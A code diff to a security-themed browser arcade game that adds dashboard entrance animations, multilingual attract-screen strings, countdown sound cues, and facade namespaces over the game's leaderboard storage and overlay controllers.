@@ -182,6 +182,43 @@ html, body { width:100%; height:100%; background:#020308; overflow:hidden; font-
 @media (max-width:640px) { .ops-strip { grid-template-columns:1fr; } }
 @media (max-height:640px) { .header { margin-bottom:10px; } .divider { margin-bottom:10px; } .card-preview { height:90px; } .card-body { padding:10px 14px 14px; } }
 
+/* ── PHASE 1 POLISH: Dashboard one-shot entrance ──
+   Fires exactly once when the boot loader triggers `#dashboard-container.is-revealed`.
+   Additive — existing hover/active/pulse rules are preserved. Custom Emil ease.
+   Reduced-motion users skip all movement (opacity snaps to 1, no translate). */
+#dashboard-container.is-revealed #app { animation: dashAppPlunge 640ms cubic-bezier(0.23, 1, 0.32, 1) both; }
+@keyframes dashAppPlunge {
+  from { opacity: 0; transform: translateY(6px); }
+  to   { opacity: 1; transform: translateY(0);   }
+}
+#dashboard-container.is-revealed .cs-eyebrow { animation: dashEyebrowFade 520ms cubic-bezier(0.23, 1, 0.32, 1) 80ms both, pulse-opacity 2.2s ease-in-out 680ms infinite; }
+@keyframes dashEyebrowFade { from { opacity: 0; letter-spacing: 10px; } to { opacity: 1; letter-spacing: 5px; } }
+#dashboard-container.is-revealed .cs-title {
+  animation: dashTitleIgnite 820ms cubic-bezier(0.23, 1, 0.32, 1) 180ms both;
+}
+@keyframes dashTitleIgnite {
+  0%   { opacity: 0; letter-spacing: 8px;   text-shadow: 0 0 0 rgba(224,0,60,0),   0 0 0 rgba(224,0,60,0); }
+  35%  { opacity: 0.7; letter-spacing: 2px; text-shadow: 0 0 28px rgba(255,216,77,0.55), 0 0 56px rgba(224,0,60,0.25); }
+  100% { opacity: 1; letter-spacing: -1px;  text-shadow: 0 0 40px rgba(224,0,60,0.55), 0 0 80px rgba(224,0,60,0.22); }
+}
+#dashboard-container.is-revealed .cs-subtitle { animation: dashSubFade 540ms cubic-bezier(0.23, 1, 0.32, 1) 420ms both; }
+@keyframes dashSubFade { from { opacity: 0; transform: translateY(4px); } to { opacity: 1; transform: translateY(0); } }
+#dashboard-container.is-revealed .divider { animation: dashDividerDraw 640ms cubic-bezier(0.23, 1, 0.32, 1) 520ms both; transform-origin: center; }
+@keyframes dashDividerDraw { from { opacity: 0; transform: scaleX(0.4); } to { opacity: 1; transform: scaleX(1); } }
+#dashboard-container.is-revealed .card { animation: dashCardSettle 560ms cubic-bezier(0.23, 1, 0.32, 1) both; }
+#dashboard-container.is-revealed .card:nth-child(1) { animation-delay: 580ms; }
+#dashboard-container.is-revealed .card:nth-child(2) { animation-delay: 660ms; }
+#dashboard-container.is-revealed .card:nth-child(3) { animation-delay: 740ms; }
+@keyframes dashCardSettle { from { opacity: 0; transform: translateY(12px) scale(0.985); } to { opacity: 1; transform: translateY(0) scale(1); } }
+@media (prefers-reduced-motion: reduce) {
+  #dashboard-container.is-revealed #app,
+  #dashboard-container.is-revealed .cs-eyebrow,
+  #dashboard-container.is-revealed .cs-title,
+  #dashboard-container.is-revealed .cs-subtitle,
+  #dashboard-container.is-revealed .divider,
+  #dashboard-container.is-revealed .card { animation: none; opacity: 1; transform: none; letter-spacing: normal; }
+}
+
 /* ── CINEMATIC BOOT ── */
 body.arcade-loader-active { overflow:hidden; }
 #cyber-loader {
@@ -629,6 +666,47 @@ body.arcade-loader-active { overflow:hidden; }
     repeating-linear-gradient(0deg,rgba(255,255,255,0.08) 0px,rgba(255,255,255,0.08) 1px,transparent 2px,transparent 4px),
     radial-gradient(circle at 50% 50%, rgba(255,255,255,0.08), transparent 56%);
   mix-blend-mode:screen;
+}
+/* ── Phase 3.A — Attract hero-word scenes (INFILTRATE / DEFEND / HUNT) ── */
+.dash-attract-hero-panel {
+  position:absolute; inset:0;
+  display:flex; flex-direction:column; justify-content:center; align-items:center;
+  padding:0 8%;
+  background:radial-gradient(ellipse at 50% 55%, rgba(12,22,34,0) 0%, rgba(6,10,16,0.72) 85%);
+}
+.dash-attract-hero-eyebrow {
+  font:600 13px/1.2 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+  letter-spacing:.38em; color:rgba(186,206,230,0.78);
+  margin-bottom:22px; opacity:0; text-transform:uppercase;
+}
+.dash-attract-hero-word {
+  font:800 clamp(72px,11vw,168px)/.92 'Rajdhani','Inter',ui-sans-serif,system-ui,sans-serif;
+  letter-spacing:.04em; color:#eaf2ff;
+  text-shadow:0 0 28px rgba(100,160,220,0.22);
+  clip-path:inset(0 100% 0 0);
+}
+.dash-attract-hero-word[data-variant="infiltrate"] {
+  color:#f4c87a; text-shadow:0 0 32px rgba(244,200,122,0.22);
+}
+.dash-attract-hero-word[data-variant="defend"] {
+  color:#7dd3fc; text-shadow:0 0 32px rgba(125,211,252,0.22);
+}
+.dash-attract-hero-word[data-variant="hunt"] {
+  color:#fca5a5; text-shadow:0 0 32px rgba(252,165,165,0.22);
+}
+.dash-attract-hero-rule {
+  margin-top:18px; width:0%; max-width:40%; height:1px;
+  background:linear-gradient(90deg,transparent 0%,rgba(234,242,255,0.55) 50%,transparent 100%);
+}
+.dash-attract-hero-sub {
+  margin-top:20px;
+  font:500 15px/1.45 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+  letter-spacing:.18em; text-transform:uppercase;
+  color:rgba(220,230,244,0.78);
+  opacity:0; max-width:70%; text-align:center;
+}
+@media (prefers-reduced-motion: reduce) {
+  .dash-attract-hero-word { clip-path:inset(0 0 0 0); }
 }
 /* ══════════════════════════════════════════════════════════════
    MISSION BRIEF OVERLAY — rebuilt per Emil's design-engineering
@@ -1148,6 +1226,31 @@ body.arcade-loader-active { overflow:hidden; }
 <script>
 
 'use strict';
+
+// ─────────────────────────────────────────────────────────────────────────────
+// FalconArcade namespace — single top-level home for internal APIs.
+// Keeps future extraction under ONE global instead of scattering new names.
+// Sub-namespaces are populated incrementally by later refactor tasks; they
+// start as empty object literals so feature code can attach to them safely
+// from any of the 4 inline <script> blocks.
+//
+// Behavior contract: NOTHING here changes runtime behavior. It only creates
+// the attachment surface. Old globals (e.g. _loadStoredArray, clearAllRankings,
+// exportAllRankingsCSV, FalconRanking, setScene, etc.) remain in place and
+// continue to be the authoritative implementations. Methods added under
+// FalconArcade.* must WRAP those, never duplicate them.
+// ─────────────────────────────────────────────────────────────────────────────
+window.FalconArcade = window.FalconArcade || {
+  Store:   {},  // Task 2 — leaderboards, persistence, CSV export
+  Overlay: {},  // reserved — overlay factory + z-index registry
+  FX:      {},  // reserved — shared visual/canvas effects
+  Audio:   {},  // reserved — SoundEngine facade (River/Defense/Hunt beds)
+  Input:   {},  // reserved — keyboard + JP IME + attract idle watch
+  Text:    {},  // reserved — T()/TF()/wrapTextPx helpers
+  Draw:    {},  // reserved — panel/roundRect/label primitives
+  Scenes:  {}   // reserved — setScene + scene-bound lifecycle hooks
+};
+
 // ── Event/Marketing Config — set BEFORE page load by booth operator ──────────
 // Example: window.ArcadeConfig={eventName:'RSA 2026',ctaUrl:'https://crowdstrike.com/trial',ctaLabel:'START YOUR FALCON TRIAL'};
 window.ArcadeConfig = window.ArcadeConfig || {
@@ -1280,6 +1383,25 @@ const TRANSLATIONS = {
     err_email_valid:'Valid work email required',
     err_email_work:'Use your corporate work email',
     dash_attract_exit:'PRESS ANY KEY OR CLICK TO EXIT',
+    // ── Phase 3.A — attract hero-word scenes ──
+    attract_hero_eyebrow:'FALCON ARCADE · THREAT SUITE',
+    attract_hero_infiltrate_word:'INFILTRATE',
+    attract_hero_infiltrate_sub:'Incident Zero — breach the firewall, reach the kernel.',
+    attract_hero_defend_word:'DEFEND',
+    attract_hero_defend_sub:'Falcon Defense — hold the perimeter until the console clears.',
+    attract_hero_hunt_word:'HUNT',
+    attract_hero_hunt_sub:'Threat Hunt — follow the signal across nine adversaries.',
+    // ── Phase 4: end-state cinematic uplift + boss dossier keys ──
+    ph4_tp_def_combo:'MAX COMBO',
+    ph4_tp_def_waves:'WAVES CLEARED',
+    ph4_tp_def_adv:'FINAL ADVERSARY',
+    ph4_tp_hunt_clues:'CLUES GATHERED',
+    ph4_tp_hunt_time:'TIME (s)',
+    ph4_tp_hunt_adv:'FINAL ADVERSARY',
+    ph4_press_retry:'PRESS R TO TRY AGAIN',
+    ph4_press_redeploy:'PRESS R TO REDEPLOY',
+    ph4_boss_contact:'▲ CONTACT DETECTED',
+    ph4_boss_counter:'RECOMMENDED COUNTER',
     // ── Game UI keys (used by T() in canvas rendering) ──
     g_score:'SCORE',             g_hi:'HI SCORE',
     g_phase:'PHASE',             g_lives:'LIVES',
@@ -1765,6 +1887,7 @@ const TRANSLATIONS = {
     g_cut_intercept:'COMMS INTERCEPT',
     // ── Missing / new keys ──
     boot_acquiring:'SIGNAL ACQUISITION INITIALIZING...',
+    boot_skip_hint:'[ SPACE ]  SKIP',
     iz_ir_label:'INCIDENT RESPONSE',
     def_marquinhos:"Let's call Marquinhos! 🇧🇷",
     g_evid_source:'SOURCE:',
@@ -1880,6 +2003,24 @@ const TRANSLATIONS = {
     err_email_valid:'Email corporativo válido obrigatório',
     err_email_work:'Use seu email corporativo',
     dash_attract_exit:'PRESSIONE QUALQUER TECLA OU CLIQUE PARA SAIR',
+    // ── Phase 3.A — attract hero-word scenes ──
+    attract_hero_eyebrow:'FALCON ARCADE · SUÍTE DE AMEAÇAS',
+    attract_hero_infiltrate_word:'INFILTRAR',
+    attract_hero_infiltrate_sub:'Incidente Zero — atravesse o firewall, alcance o kernel.',
+    attract_hero_defend_word:'DEFENDER',
+    attract_hero_defend_sub:'Defesa Falcon — segure o perímetro até o console limpar.',
+    attract_hero_hunt_word:'CAÇAR',
+    attract_hero_hunt_sub:'Caça à Ameaça — siga o sinal por nove adversários.',
+    ph4_tp_def_combo:'COMBO MÁX',
+    ph4_tp_def_waves:'ONDAS LIMPAS',
+    ph4_tp_def_adv:'ADVERSÁRIO FINAL',
+    ph4_tp_hunt_clues:'PISTAS REUNIDAS',
+    ph4_tp_hunt_time:'TEMPO (s)',
+    ph4_tp_hunt_adv:'ADVERSÁRIO FINAL',
+    ph4_press_retry:'PRESSIONE R PARA TENTAR',
+    ph4_press_redeploy:'PRESSIONE R PARA IMPLANTAR',
+    ph4_boss_contact:'▲ CONTATO DETECTADO',
+    ph4_boss_counter:'CONTRA RECOMENDADO',
     g_score:'PONTOS',            g_hi:'RECORDE',
     g_phase:'FASE',              g_lives:'VIDAS',
     g_paused:'PAUSADO',          g_fuel:'COMBUSTÍVEL',
@@ -2362,6 +2503,7 @@ const TRANSLATIONS = {
     g_cut_intercept:'INTERCEPTAÇÃO DE COMMS',
     // ── Missing / new keys ──
     boot_acquiring:'INICIALIZANDO AQUISIÇÃO DE SINAL...',
+    boot_skip_hint:'[ ESPAÇO ]  PULAR',
     iz_ir_label:'RESPOSTA A INCIDENTES',
     def_marquinhos:'Vamos chamar o Marquinhos! 🇧🇷',
     g_evid_source:'ORIGEM:',
@@ -2477,6 +2619,24 @@ const TRANSLATIONS = {
     err_email_valid:'Se requiere un correo corporativo válido',
     err_email_work:'Usa tu correo corporativo',
     dash_attract_exit:'PULSA CUALQUIER TECLA O HAZ CLIC PARA SALIR',
+    // ── Phase 3.A — attract hero-word scenes ──
+    attract_hero_eyebrow:'FALCON ARCADE · SUITE DE AMENAZAS',
+    attract_hero_infiltrate_word:'INFILTRAR',
+    attract_hero_infiltrate_sub:'Incidente Cero — cruza el firewall, alcanza el kernel.',
+    attract_hero_defend_word:'DEFENDER',
+    attract_hero_defend_sub:'Defensa Falcon — sostén el perímetro hasta que la consola limpie.',
+    attract_hero_hunt_word:'CAZAR',
+    attract_hero_hunt_sub:'Cacería — sigue la señal entre nueve adversarios.',
+    ph4_tp_def_combo:'COMBO MÁX',
+    ph4_tp_def_waves:'OLEADAS',
+    ph4_tp_def_adv:'ADVERSARIO FINAL',
+    ph4_tp_hunt_clues:'PISTAS REUNIDAS',
+    ph4_tp_hunt_time:'TIEMPO (s)',
+    ph4_tp_hunt_adv:'ADVERSARIO FINAL',
+    ph4_press_retry:'R PARA REINTENTAR',
+    ph4_press_redeploy:'R PARA REDESPLEGAR',
+    ph4_boss_contact:'▲ CONTACTO DETECTADO',
+    ph4_boss_counter:'CONTRA RECOMENDADO',
     g_score:'PUNTOS',            g_hi:'RÉCORD',
     g_phase:'FASE',              g_lives:'VIDAS',
     g_paused:'PAUSADO',          g_fuel:'COMBUSTIBLE',
@@ -2959,6 +3119,7 @@ const TRANSLATIONS = {
     g_cut_intercept:'INTERCEPTACIÓN DE COMUNICACIONES',
     // ── Missing / new keys ──
     boot_acquiring:'INICIALIZANDO ADQUISICIÓN DE SEÑAL...',
+    boot_skip_hint:'[ ESPACIO ]  OMITIR',
     iz_ir_label:'RESPUESTA A INCIDENTES',
     def_marquinhos:'¡Llamemos a Marquinhos! 🇧🇷',
     g_evid_source:'ORIGEN:',
@@ -3074,6 +3235,24 @@ const TRANSLATIONS = {
     err_email_valid:'有効な勤務先メールが必要です',
     err_email_work:'勤務先のメールアドレスを使用してください',
     dash_attract_exit:'任意のキーまたはクリックで終了',
+    // ── Phase 3.A — attract hero-word scenes ──
+    attract_hero_eyebrow:'ファルコン・アーケード・脅威スイート',
+    attract_hero_infiltrate_word:'潜入',
+    attract_hero_infiltrate_sub:'インシデント・ゼロ — ファイアウォールを突破し、カーネルへ。',
+    attract_hero_defend_word:'防衛',
+    attract_hero_defend_sub:'ファルコン防衛 — コンソールがクリアするまで境界を守れ。',
+    attract_hero_hunt_word:'追跡',
+    attract_hero_hunt_sub:'脅威追跡 — 九の敵対者を追え。',
+    ph4_tp_def_combo:'最大コンボ',
+    ph4_tp_def_waves:'撃破ウェーブ',
+    ph4_tp_def_adv:'最終敵対者',
+    ph4_tp_hunt_clues:'収集した手掛かり',
+    ph4_tp_hunt_time:'時間（秒）',
+    ph4_tp_hunt_adv:'最終敵対者',
+    ph4_press_retry:'Rキーで再挑戦',
+    ph4_press_redeploy:'Rキーで再展開',
+    ph4_boss_contact:'▲ 接触検出',
+    ph4_boss_counter:'推奨対策',
     g_score:'スコア',              g_hi:'ハイスコア',
     g_phase:'フェーズ',            g_lives:'ライフ',
     g_paused:'一時停止',           g_fuel:'燃料',
@@ -3556,6 +3735,7 @@ const TRANSLATIONS = {
     g_cut_intercept:'通信傍受',
     // ── Missing / new keys ──
     boot_acquiring:'信号取得を初期化中...',
+    boot_skip_hint:'[ SPACE ]  スキップ',
     iz_ir_label:'インシデント対応',
     def_marquinhos:'マルキーニョスに連絡! 🇧🇷',
     g_evid_source:'発信元:',
@@ -4053,6 +4233,9 @@ function _ensureMissionBriefOverlay() {
   let sceneTimer = null;
   let progressRaf = 0;
   let cycleStartedAt = 0;
+  // Phase 2: last whole-second remaining that fired a heartbeat tick.
+  // Sentinel 99 means "no tick fired yet this cycle" (resets on open/close).
+  let countdownLastTick = 99;
   const reduceMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
   const BASE_SCENE_MS = reduceMotion ? 3600 : 3000;
   let sceneMs = BASE_SCENE_MS;
@@ -4124,7 +4307,20 @@ function _ensureMissionBriefOverlay() {
     const totalMs = currentData.scenes.length * sceneMs;
     const elapsed = performance.now() - cycleStartedAt;
     refs.progress.style.width = `${Math.min(100, (elapsed / totalMs) * 100)}%`;
-    refs.continue.textContent = `${currentData.shared.continue} · ${T('brief_auto_deploy')} ${Math.max(0, Math.ceil((totalMs - elapsed) / 1000))}s`;
+    const remainingSec = Math.max(0, Math.ceil((totalMs - elapsed) / 1000));
+    refs.continue.textContent = `${currentData.shared.continue} · ${T('brief_auto_deploy')} ${remainingSec}s`;
+    // Phase 2: heartbeat tick on each of the final 3 whole seconds. The
+    // stinger rises in brightness toward t=0 (step 0=3s rem, 2=1s rem).
+    // Fires once per second-boundary crossing; countdownLastTick holds
+    // the last-seen value so rAF rate doesn't spam the stinger.
+    if (remainingSec <= 3 && remainingSec >= 1 && remainingSec !== countdownLastTick) {
+      countdownLastTick = remainingSec;
+      try{
+        if (window.SoundEngine?.stinger) {
+          window.SoundEngine.stinger.fire('brief_countdown_tick', { step: 3 - remainingSec });
+        }
+      }catch(_){}
+    }
     if (elapsed >= totalMs) {
       confirmLaunch();
       return;
@@ -4166,6 +4362,7 @@ function _ensureMissionBriefOverlay() {
     try{document.activeElement?.blur();}catch(_){}
     refs.overlay.setAttribute('aria-hidden', 'true');
     refs.progress.style.width = '0%';
+    countdownLastTick = 99;
     pendingLaunch = null;
     currentData = null;
     // Fade+blur exit so the dashboard never flashes overlapping text.
@@ -4193,7 +4390,14 @@ function _ensureMissionBriefOverlay() {
   function confirmLaunch() {
     if (!pendingLaunch) return;
     const launch = pendingLaunch;
-    ArcadeSonic.confirm();
+    // Phase 2 Zimmer DEPLOY commit — taiko + 180ms silence + braam + sub.
+    // Fire BEFORE close() so the stinger rides under the brief's fade-out
+    // and lands at full volume as the overlay clears. Fallback to
+    // ArcadeSonic.confirm() when SoundEngine isn't available.
+    try{
+      if (window.SoundEngine?.stinger) window.SoundEngine.stinger.fire('brief_deploy_commit');
+      else ArcadeSonic.confirm();
+    }catch(_){ try{ ArcadeSonic.confirm(); }catch(__){ } }
     // Close the mission brief FIRST so it starts fading out, then paint the deploy overlay
     // above it (deploy z:13500 > mission-brief z:12500) so no text overlap is visible.
     close();
@@ -4243,12 +4447,19 @@ function _ensureMissionBriefOverlay() {
       refs.shell.focus({ preventScroll:true });
       stopTimer();
       cycleStartedAt = performance.now();
+      countdownLastTick = 99;
       sceneTimer = setInterval(() => {
         if (!currentData) return;
         applyScene((sceneIndex + 1) % currentData.scenes.length);
       }, sceneMs);
       progressRaf = requestAnimationFrame(tickProgress);
-      ArcadeSonic.uiOpen();
+      // Phase 2 Zimmer brief-open: orchestral swell replaces the Atari uiOpen.
+      // Fallback to ArcadeSonic.uiOpen() if SoundEngine isn't available yet
+      // (e.g. first render before the audio graph initialises).
+      try{
+        if (window.SoundEngine?.stinger) window.SoundEngine.stinger.fire('brief_enter');
+        else ArcadeSonic.uiOpen();
+      }catch(_){ try{ ArcadeSonic.uiOpen(); }catch(__){ } }
     },
     close,
     refresh() {
@@ -4530,6 +4741,1282 @@ function clearAllRankings() {
   _refreshPodium();
 }
 
+// ─────────────────────────────────────────────────────────────────────────────
+// FalconArcade.Store — facade over the per-game storage helpers above.
+//
+// This is a FACADE, not a rewrite. Every method here delegates to an existing
+// function; the underlying storage keys (sessionStorage for rankings,
+// localStorage for hi-scores + backup) are untouched. Existing globals
+// (_loadStoredArray, _saveStoredArray, clearAllRankings, exportAllRankingsCSV,
+// _rankingEntriesFor, _loadStoredNumber, _saveStoredNumber, _removeStoredKey,
+// ARCADE_RANKING_KEYS, dedupeEntriesByEmail) all remain in place and are the
+// authoritative implementations. The Store is just a single import surface
+// for future callers — it does not replace any call site in the current build.
+//
+// Task 2 public API (as specified by the caller):
+//   Store.load()            → aggregate snapshot: { incident_zero:[], falcon_defense:[], threat_hunt:[] }
+//   Store.save(entries)     → write aggregate snapshot (missing games are left untouched)
+//   Store.topN(n)           → cross-game top-N, sorted by score desc
+//   Store.reset()           → clears all 3 rankings + the 15-min backup blob
+//   Store.exportCSV()       → downloads the combined CSV (same file name the dashboard produces)
+//
+// Convenience extensions (non-breaking additions, same contract):
+//   Store.load(gameId)      → just that one game's entries array
+//   Store.save(gameId, arr) → just that one game's entries
+//   Store.topN(n, gameId)   → top-N within a single game
+//   Store.keys              → frozen copy of ARCADE_RANKING_KEYS
+//   Store.gameIds           → ['incident_zero','falcon_defense','threat_hunt']
+//   Store.hiScore.load(gameId [, fallback]) / Store.hiScore.save(gameId, value)
+//
+// gameId aliases accepted everywhere: short form ('incident_zero', 'falcon_defense',
+// 'threat_hunt'), legacy aliases ('zero','defense','hunt'), or the full storage
+// key ('cs_ranking_incident_zero_v1' etc.). Invalid ids return empty/no-op.
+// ─────────────────────────────────────────────────────────────────────────────
+(function _installFalconArcadeStore(){
+  // gameId → ranking storage key
+  const RANKING_KEY = Object.freeze({
+    incident_zero:  'cs_ranking_incident_zero_v1',
+    falcon_defense: 'cs_ranking_falcon_defense_v1',
+    threat_hunt:    'cs_ranking_threat_hunt_v1',
+    // legacy short aliases — keep for ergonomic calls from game code
+    zero:    'cs_ranking_incident_zero_v1',
+    defense: 'cs_ranking_falcon_defense_v1',
+    hunt:    'cs_ranking_threat_hunt_v1',
+  });
+  // gameId → hi-score localStorage key (these are SEPARATE from ranking keys)
+  const HISCORE_KEY = Object.freeze({
+    incident_zero:  'cs_hiscore_incident_zero_v1',
+    falcon_defense: 'cs_hi',
+    threat_hunt:    'cs_threat_hunt_hi',
+    zero:    'cs_hiscore_incident_zero_v1',
+    defense: 'cs_hi',
+    hunt:    'cs_threat_hunt_hi',
+  });
+  const GAME_IDS = Object.freeze(['incident_zero', 'falcon_defense', 'threat_hunt']);
+
+  // Resolve any accepted form → canonical storage key (or null if unrecognized)
+  function _resolveRankingKey(id) {
+    if (!id) return null;
+    // already a full storage key?
+    if (ARCADE_RANKING_KEYS.indexOf(id) !== -1) return id;
+    return RANKING_KEY[id] || null;
+  }
+  // Resolve any accepted form → canonical gameId (or null)
+  function _resolveGameId(id) {
+    if (!id) return null;
+    if (GAME_IDS.indexOf(id) !== -1) return id;
+    // reverse-lookup alias
+    const full = RANKING_KEY[id];
+    if (full) {
+      for (let i = 0; i < GAME_IDS.length; i++) {
+        if (RANKING_KEY[GAME_IDS[i]] === full) return GAME_IDS[i];
+      }
+    }
+    // full storage key → gameId
+    for (let i = 0; i < GAME_IDS.length; i++) {
+      if (RANKING_KEY[GAME_IDS[i]] === id) return GAME_IDS[i];
+    }
+    return null;
+  }
+
+  function load(gameId) {
+    if (gameId === undefined) {
+      // Aggregate snapshot (spec: Store.load() with no args)
+      const snap = {};
+      GAME_IDS.forEach(g => { snap[g] = _loadStoredArray(RANKING_KEY[g]); });
+      return snap;
+    }
+    const key = _resolveRankingKey(gameId);
+    return key ? _loadStoredArray(key) : [];
+  }
+
+  function save(entriesOrGameId, maybeEntries) {
+    // Overload 1: save(gameId, entries) — per-game write
+    if (typeof entriesOrGameId === 'string') {
+      const key = _resolveRankingKey(entriesOrGameId);
+      if (!key) return false;
+      return _saveStoredArray(key, Array.isArray(maybeEntries) ? maybeEntries : []);
+    }
+    // Overload 2: save(aggregateSnapshot) — partial or full object
+    const snap = entriesOrGameId || {};
+    let anyWritten = false;
+    GAME_IDS.forEach(g => {
+      if (Array.isArray(snap[g])) {
+        if (_saveStoredArray(RANKING_KEY[g], snap[g])) anyWritten = true;
+      }
+      // also accept full-key shape (e.g. { 'cs_ranking_incident_zero_v1': [...] })
+      const fullKey = RANKING_KEY[g];
+      if (Array.isArray(snap[fullKey])) {
+        if (_saveStoredArray(fullKey, snap[fullKey])) anyWritten = true;
+      }
+    });
+    return anyWritten;
+  }
+
+  function topN(n, gameId) {
+    const limit = Math.max(0, Number(n) | 0);
+    const byScore = (a, b) => Number(b.score || 0) - Number(a.score || 0);
+    if (gameId !== undefined) {
+      const key = _resolveRankingKey(gameId);
+      if (!key) return [];
+      return _loadStoredArray(key).slice().sort(byScore).slice(0, limit);
+    }
+    // Cross-game top-N — annotate each row with its source game so callers
+    // can distinguish. Uses the same score field and sort order as
+    // exportAllRankingsCSV + rankingHeroCandidates.
+    const merged = [];
+    GAME_IDS.forEach(g => {
+      _loadStoredArray(RANKING_KEY[g]).forEach(entry => {
+        merged.push(Object.assign({}, entry, { gameId: g }));
+      });
+    });
+    return merged.sort(byScore).slice(0, limit);
+  }
+
+  function reset() {
+    // Delegates to clearAllRankings — which also clears the localStorage
+    // backup blob and calls _refreshPodium() to redraw the dashboard podium.
+    return clearAllRankings();
+  }
+
+  function exportCSV() {
+    // Delegates to exportAllRankingsCSV — same file name, same columns,
+    // same escape rules. Returns false if there's nothing to export.
+    return exportAllRankingsCSV();
+  }
+
+  // Hi-score sub-facade — wraps the separate localStorage number slots each
+  // game uses for its personal-best display (NOT the ranking entries above).
+  const hiScore = Object.freeze({
+    load(gameId, fallback = 0) {
+      const key = HISCORE_KEY[gameId];
+      return key ? _loadStoredNumber(key, fallback) : fallback;
+    },
+    save(gameId, value) {
+      const key = HISCORE_KEY[gameId];
+      return key ? _saveStoredNumber(key, value) : false;
+    },
+    keyFor(gameId) { return HISCORE_KEY[gameId] || null; },
+  });
+
+  // Attach to namespace. Keep the object frozen so later code can't shadow
+  // methods by accident; internal mutable state (if any) lives in closures.
+  window.FalconArcade.Store = Object.freeze({
+    load, save, topN, reset, exportCSV,
+    hiScore,
+    keys: ARCADE_RANKING_KEYS,                            // frozen already
+    gameIds: GAME_IDS,                                    // frozen already
+    keyFor(gameId){ return _resolveRankingKey(gameId); }, // exposed for tests / future callers
+    // Escape hatch: hand back the dedupe helper so callers don't have to
+    // reach for the global. Same function reference, no wrapping.
+    dedupeByEmail: dedupeEntriesByEmail,
+  });
+})();
+
+// ─────────────────────────────────────────────────────────────────────────────
+// FalconArcade.Overlay — thin facade over the existing overlay controllers.
+//
+// This is a REGISTRY + DISPATCHER. It creates no new DOM, injects no CSS,
+// changes no animation timing, and never rewrites a keyboard handler. Every
+// method delegates to an existing function or DOM element already wired up
+// elsewhere in this file. Adding this namespace does not alter any current
+// call site — it just exposes a single uniform import surface for future
+// callers.
+//
+// Public API (spec):
+//   Overlay.show(name [, ...args])    — open a named overlay
+//   Overlay.hide(name [, ...args])    — close a named overlay
+//   Overlay.clear(name)               — close + remove DOM node (if any)
+//   Overlay.showForm(data)            — show active game's lead-capture form
+//   Overlay.showAttract()             — start dashboard attract mode
+//   Overlay.toast(msg, color)         — show a toast (active game's toast bus)
+//
+// Extensions (non-breaking conveniences):
+//   Overlay.isOpen(name)      — boolean
+//   Overlay.list()            — registered names
+//   Overlay.register(name, handlers)  — plug in a custom overlay
+//   Overlay.unregister(name)
+//   Overlay.registerForm(gameId, fn)  — wire a game's form renderer (blocks 2/3/4 do this)
+//   Overlay.registerToast(gameId, fn) — wire a game's toast renderer
+//   Overlay.hideAttract()
+//
+// Built-in named overlays (resolved lazily via late-bound closures so the
+// underlying controllers/functions can be declared AFTER this IIFE runs):
+//   'mission-brief'       → _missionBriefController.open / .close
+//   'deploy'              → showDeployOverlay (self-dismissing)
+//   'dashboard-rankings'  → openDashboardRankings / closeDashboardRankings
+//   'dash-disclaimer'     → _ensureDashDisclaimer (one-shot ack)
+//   'return-to-menu'      → returnToDashboard (full flow)
+//   'attract'             → _dashboardAttract.start / .stop
+//   'post-game-cta'       → window._showPostGameCTA
+//
+// Keyboard dismiss behavior: UNCHANGED. All Escape/Space/Enter handlers
+// stay on the original controllers — this facade doesn't install any of
+// its own keyboard listeners.
+// ─────────────────────────────────────────────────────────────────────────────
+(function _installFalconArcadeOverlay(){
+  const _registry = Object.create(null);  // name -> { show, hide, isOpen, el }
+  const _forms    = Object.create(null);  // gameId -> (data) => void
+  const _toasts   = Object.create(null);  // gameId -> (msg, color) => void
+
+  // Game id aliases — short form ↔ canonical ↔ containerId.
+  const _GAME_ALIASES = {
+    zero: ['zero', 'incident_zero', 'game-zero-container'],
+    defense: ['defense', 'falcon_defense', 'game-defense-container'],
+    hunt: ['hunt', 'threat_hunt', 'game-hunt-container'],
+  };
+  function _aliasesFor(gameId) {
+    if (!gameId) return [];
+    for (const k of Object.keys(_GAME_ALIASES)) {
+      if (_GAME_ALIASES[k].indexOf(gameId) !== -1) return _GAME_ALIASES[k];
+    }
+    return [gameId];
+  }
+  function _activeGid() {
+    // _activeGameId is a `let` in this block; read via window to avoid any
+    // closure-scope surprises and to let tests inject a value.
+    return window._activeGameId || (typeof _activeGameId !== 'undefined' ? _activeGameId : null);
+  }
+
+  // Late-bind helper: the returned function resolves the real target at call
+  // time, so controllers initialized AFTER this IIFE (like _dashboardAttract
+  // at line ~5604 and the mission-brief controller at DOM-ready) still work.
+  function _late(getter) {
+    return function (/* ...args */) {
+      try {
+        const fn = getter();
+        if (typeof fn !== 'function') return false;
+        return fn.apply(null, arguments);
+      } catch (_) { return false; }
+    };
+  }
+
+  // ── Built-in overlay entries ───────────────────────────────────────────
+  // Each entry is { show, hide, isOpen? }. Missing methods are treated as
+  // no-ops by the dispatcher, not errors — so e.g. 'deploy' has no hide()
+  // because it self-dismisses.
+  _registry['mission-brief'] = {
+    show: _late(() => (_missionBriefController && _missionBriefController.open) ? _missionBriefController.open.bind(_missionBriefController) : null),
+    hide: _late(() => (_missionBriefController && _missionBriefController.close) ? _missionBriefController.close.bind(_missionBriefController) : null),
+    isOpen() {
+      const el = document.getElementById('mission-brief-overlay');
+      return !!(el && el.classList.contains('is-open'));
+    },
+  };
+  _registry['deploy'] = {
+    // Pass through an optional callback — matches showDeployOverlay(cb) signature.
+    show: _late(() => (typeof showDeployOverlay === 'function' ? showDeployOverlay : null)),
+    // No manual close — deploy auto-fades itself out at 300ms after a 400ms hold.
+    hide: null,
+    isOpen() { return !!document.getElementById('deploy-overlay'); },
+  };
+  _registry['dashboard-rankings'] = {
+    show: _late(() => (typeof openDashboardRankings === 'function' ? openDashboardRankings : null)),
+    hide: _late(() => (typeof closeDashboardRankings === 'function' ? closeDashboardRankings : null)),
+    isOpen: _late(() => (typeof rankingsOverlayOpen === 'function' ? rankingsOverlayOpen : null)),
+  };
+  _registry['dash-disclaimer'] = {
+    // Accepts the same onAcknowledge callback as _ensureDashDisclaimer.
+    show: _late(() => (typeof _ensureDashDisclaimer === 'function' ? _ensureDashDisclaimer : null)),
+    // Manual hide — removes the element if still present (rare; normally user acks).
+    hide() {
+      const el = document.getElementById('dash-disclaimer-overlay');
+      if (el) { el.remove(); return true; }
+      return false;
+    },
+    isOpen() { return !!document.getElementById('dash-disclaimer-overlay'); },
+  };
+  _registry['return-to-menu'] = {
+    // This is a FLOW (not a simple show) — fades game container, swaps to dashboard.
